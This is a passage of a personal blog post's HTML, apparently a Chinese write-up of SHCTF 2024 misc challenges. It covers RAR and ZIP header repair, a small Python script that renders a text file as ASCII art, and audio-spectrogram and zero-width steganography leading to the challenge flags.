+<li><code>HEAD_TYPE = 0x79</code> - SIGN_HEAD(旧风格的授权信息块/用户身份信息块)</li>
+<li><code>HEAD_TYPE = 0x7A</code> - NEWSUB_HEAD(子块)</li>
+<li><code>HEAD_TYPE = 0x7B</code> - ENDARC_HEAD(结束块)</li>
+</ul>
+<p>winhex查看rar：</p>
+<p><figure><a class="lightgallery" href="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113222843060.png" title="image-20241113222843060" data-thumbnail="C:\Users\scofi\AppData\Roaming\Typora\typora-user-images\image-20241113222843060.png">
+        <img
+            
+            loading="lazy"
+            src="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113222843060.png"
+            srcset="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113222843060.png, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113222843060.png 1.5x, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113222843060.png 2x"
+            sizes="auto"
+            alt="image-20241113222843060">
+    </a></figure></p>
+<p>有<code>draw.txt</code>，往前看，HEAD_TYPE的字节是<code>7A</code>，将其改成<code>74</code></p>
+<p>正常解压，得到draw.txt</p>
+<p>放到vscode中查看，发现又图形</p>
+<p><figure><a class="lightgallery" href="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113223030533.png" title="image-20241113223030533" data-thumbnail="C:\Users\scofi\AppData\Roaming\Typora\typora-user-images\image-20241113223030533.png">
+        <img
+            
+            loading="lazy"
+            src="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113223030533.png"
+            srcset="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113223030533.png, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113223030533.png 1.5x, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113223030533.png 2x"
+            sizes="auto"
+            alt="image-20241113223030533">
+    </a></figure></p>
+<p>缩放一下，是一座塔楼</p>
+<p><figure><a class="lightgallery" href="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113223458564.png" title="image-20241113223458564" data-thumbnail="C:\Users\scofi\AppData\Roaming\Typora\typora-user-images\image-20241113223458564.png">
+        <img
+            
+            loading="lazy"
+            src="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113223458564.png"
+            srcset="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113223458564.png, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113223458564.png 1.5x, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241113223458564.png 2x"
+            sizes="auto"
+            alt="image-20241113223458564">
+    </a></figure></p>
+<p>为了方便画图，我们将其设定为0是空格，<code>|</code>是1，<code>-</code>是2，<code>/</code>是3，<code>\</code>是4</p>
+<p>参考官方wp脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">PIL</span> <span class="n">import</span> <span class="ne">Image</span><span class="p">,</span> <span class="n">ImageDraw</span><span class="p">,</span> <span class="n">ImageFont</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 设定对应关系</span>
+</span></span><span class="line"><span class="cl"><span class="n">char_map</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;0&#39;</span><span class="p">:</span> <span class="s1">&#39; &#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;1&#39;</span><span class="p">:</span> <span class="s1">&#39;|&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;2&#39;</span><span class="p">:</span> <span class="s1">&#39;-&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;3&#39;</span><span class="p">:</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;4&#39;</span><span class="p">:</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 读取txt文件</span>
+</span></span><span class="line"><span class="cl"><span class="n">with</span> <span class="n">open</span><span class="p">(</span><span class="s1">&#39;draw.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="n">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 替换数字为字符</span>
+</span></span><span class="line"><span class="cl"><span class="n">lines</span> <span class="o">=</span> <span class="p">[[</span><span class="n">char_map</span><span class="p">[</span><span class="n">ch</span><span class="p">]</span> <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()]</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">font_size</span> <span class="o">=</span> <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="n">width</span> <span class="o">=</span> <span class="n">len</span><span class="p">(</span><span class="n">lines</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">*</span> <span class="n">font_size</span>
+</span></span><span class="line"><span class="cl"><span class="n">height</span> <span class="o">=</span> <span class="n">len</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span> <span class="o">*</span> <span class="n">font_size</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">image</span> <span class="o">=</span> <span class="ne">Image</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;RGB&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">width</span><span class="p">,</span> <span class="n">height</span><span class="p">),</span> <span class="n">color</span><span class="o">=</span><span class="s1">&#39;white&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">draw</span> <span class="o">=</span> <span class="n">ImageDraw</span><span class="o">.</span><span class="n">Draw</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">font</span> <span class="o">=</span> <span class="n">ImageFont</span><span class="o">.</span><span class="n">load_default</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">y</span><span class="p">,</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">enumerate</span><span class="p">(</span><span class="n">lines</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">enumerate</span><span class="p">(</span><span class="n">line</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">draw</span><span class="o">.</span><span class="n">text</span><span class="p">((</span><span class="n">x</span> <span class="o">*</span> <span class="n">font_size</span><span class="p">,</span> <span class="n">y</span> <span class="o">*</span> <span class="n">font_size</span><span class="p">),</span> <span class="n">ch</span><span class="p">,</span> <span class="n">font</span><span class="o">=</span><span class="n">font</span><span class="p">,</span> <span class="n">fill</span><span class="o">=</span><span class="s1">&#39;black&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 保存图片</span>
+</span></span><span class="line"><span class="cl"><span class="n">output_image</span> <span class="o">=</span> <span class="s1">&#39;draw.png&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">image</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">output_image</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>搜一下7层高塔，对比发现是大雁塔</p>
+<p>SHCTF{MD5(大雁塔)}即：</p>
+<p>SHCTF{21506a1b677c7254879d86bbec5b4ec9}</p>
+<h3 id="音频里怎么有一幅画" class="headerLink">
+    <a href="#%e9%9f%b3%e9%a2%91%e9%87%8c%e6%80%8e%e4%b9%88%e6%9c%89%e4%b8%80%e5%b9%85%e7%94%bb" class="header-mark"></a>音频里怎么有一幅画？</h3><p>在deep文件属性中找到密码MARETU</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113112236071.png?imageSlim" title="image-20241113112236071" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113112236071.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113112236071.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113112236071.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113112236071.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113112236071.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241113112236071">
+    </a></figure></p>
+<p>使用 <code>deepsound</code> 解密 <code>deep.wav</code>，得到 <code>key.rar</code> ，使用 <code>010 Editor</code> 打开。</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113112618711.png?imageSlim" title="image-20241113112618711" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113112618711.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113112618711.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113112618711.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113112618711.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113112618711.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241113112618711">
+    </a></figure></p>
+<p>删除 <code>RAR!</code> 字符，并将 <code>KP</code> 改为 <code>PK</code>，然后运行 ZIP 模板。</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113112804909.png?imageSlim" title="image-20241113112804909" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113112804909.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113112804909.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113112804909.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113112804909.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113112804909.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241113112804909">
+    </a></figure></p>
+<p>压缩软件以及中心目录区的压缩文件名显示为 <code>key.wav</code>，但数据存储区显示为 <code>key</code>，<code>.wav</code> 被归到数据区内，这表明文件头的内容被修改了。</p>
+<p>需要调整数据区的 <code>.wav</code> 使其回到正确的文件名位置。模板的运行结果没有报错，说明参数设置没有矛盾。</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113113440158.png?imageSlim" title="image-20241113113440158" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113113440158.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113113440158.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113113440158.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113113440158.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113113440158.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241113113440158">
+    </a></figure></p>
+<p>根据文件头信息，能发现文件名长度 <code>frFileNameLength</code> 的值被设置为 3，直接将其修改为 7。但只修改文件名长度会导致模板运行错误，并且运行结果也没有中心目录区，说明数据区内容识别错误。</p>
+<p>需要同时调整 <code>frCompressedSize</code> 和 <code>frFileNameLength</code> 为 <code>2236116</code> 和 <code>7</code>，然后重新运行 ZIP 模板。</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113113722503.png?imageSlim" title="image-20241113113722503" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113113722503.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113113722503.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113113722503.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113113722503.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113113722503.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241113113722503">
+    </a></figure></p>
+<p>运行模板没有报错，但还是不能解压。</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113140924295.png?imageSlim" title="image-20241113140924295" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113140924295.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113140924295.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113140924295.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113140924295.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113140924295.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241113140924295">
+    </a></figure></p>
+<p><code>010 Editor</code> 拉到最下面也可以看到有注释内容。但通过bandzip注释又看不到内容。</p>
+<p>通过 zwsp-steg 解密零宽字符。</p>
+<p><a href="https://offdev.net/demos/zwsp-steg-js?" target="_blank" rel="noopener noreferrer">Offdev.net - Zero-width space steganography javascript demo</a></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113141031491.png?imageSlim" title="image-20241113141031491" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113141031491.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113141031491.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113141031491.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113141031491.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113141031491.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241113141031491">
+    </a></figure></p>
+<p>推测该zip为真加密，密码为<code>Z3r0-W1D7H</code></p>
+<p>将数据区和目录区的加密标志位都改为 <code>09</code>。</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113141328023.png?imageSlim" title="image-20241113141328023" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113141328023.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113141328023.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113141328023.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113141328023.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113141328023.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241113141328023">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113141313551.png?imageSlim" title="image-20241113141313551" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113141313551.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113141313551.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113141313551.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113141313551.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113141313551.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241113141313551">
+    </a></figure></p>
+<p>解压得到<code>key.wav</code> 文件</p>
+<p>查看频谱图</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113142038457.png?imageSlim" title="image-20241113142038457" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113142038457.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113142038457.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113142038457.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113142038457.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113142038457.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241113142038457">
+    </a></figure></p>
+<p>识别Aztec Code</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113165853677.png?imageSlim" title="image-20241113165853677" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113165853677.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113165853677.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113165853677.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113165853677.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113165853677.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241113165853677">
+    </a></figure></p>
+<p>将其分离立体声到单声道，并对上面的声道做反相处理</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113164130671.png?imageSlim" title="image-20241113164130671" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113164130671.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113164130671.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113164130671.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113164130671.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113164130671.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241113164130671">
+    </a></figure></p>
+<p>随后对两个声道进行混音</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113164218394.png?imageSlim" title="image-20241113164218394" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113164218394.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113164218394.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113164218394.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113164218394.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113164218394.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241113164218394">
+    </a></figure></p>
+<p>得到完整的汉信码</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113165015728.png?imageSlim" title="image-20241113165015728" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113165015728.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113165015728.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113165015728.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113165015728.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113165015728.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241113165015728">
+    </a></figure></p>
+<p>扫描汉信码</p>
+<p><a href="https://tuzim.net/hxdecode/" target="_blank" rel="noopener noreferrer">在线汉信码识别,汉信码解码 - 兔子二维码</a></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113165213436.png?imageSlim" title="image-20241113165213436" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113165213436.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113165213436.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113165213436.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113165213436.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113165213436.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241113165213436">
+    </a></figure></p>
+<p><a href="https://mp.weixin.qq.com/s/i4WR5ULH1ZZYl8Watf3EPw" target="_blank" rel="noopener noreferrer">AI 生成可扫码图像 — 新 ControlNet 模型展示</a></p>
+<p>分析flag.wav频谱图</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113170136174.png?imageSlim" title="image-20241113170136174" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113170136174.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113170136174.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113170136174.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113170136174.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113170136174.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241113170136174">
+    </a></figure></p>
+<p>发现 <code>flag.wav</code> 的图片明显被污染，猜测污染源就是这两个码。根据 <code>Aztec Code</code> 的时间 <code>00:11:67</code>，推测两个二维码音频的起点是 <code>00:11:67</code>。</p>
+<p>将汉信码和 <code>flag.wav</code> 的另一个声道反相，然后混音，得到最终的图片。</p>
+<p>(偷一下官方wp的图)</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113173832589.png?imageSlim" title="image-20241113173832589" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113173832589.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113173832589.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113173832589.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113173832589.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113173832589.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241113173832589">
+    </a></figure></p>
+<p>暴力识别</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113174031437.png?imageSlim" title="image-20241113174031437" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113174031437.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113174031437.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113174031437.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113174031437.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241113174031437.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20241113174031437">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SHCTF{AI_4rt_1s_M4gica1}
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-11-13</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/2024shctf_misc/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\2024shctf_misc.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\2024shctf_misc.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%202024SHCTF_misc&body=|Field|Value|%0A|-|-|%0A|Title|2024SHCTF_misc|%0A|Url|http://scofield1920.github.io/2024shctf_misc/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\2024shctf_misc.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/2024shctf_misc/" data-title="2024SHCTF_misc" data-hashtags="wp,misc"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/2024shctf_misc/" data-hashtag="wp"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/2024shctf_misc/" data-title="2024SHCTF_misc"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/2024shctf_misc/" data-title="2024SHCTF_misc"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/2024shctf_misc/" data-title="2024SHCTF_misc"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/2024shctf_misc/" data-title="2024SHCTF_misc" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
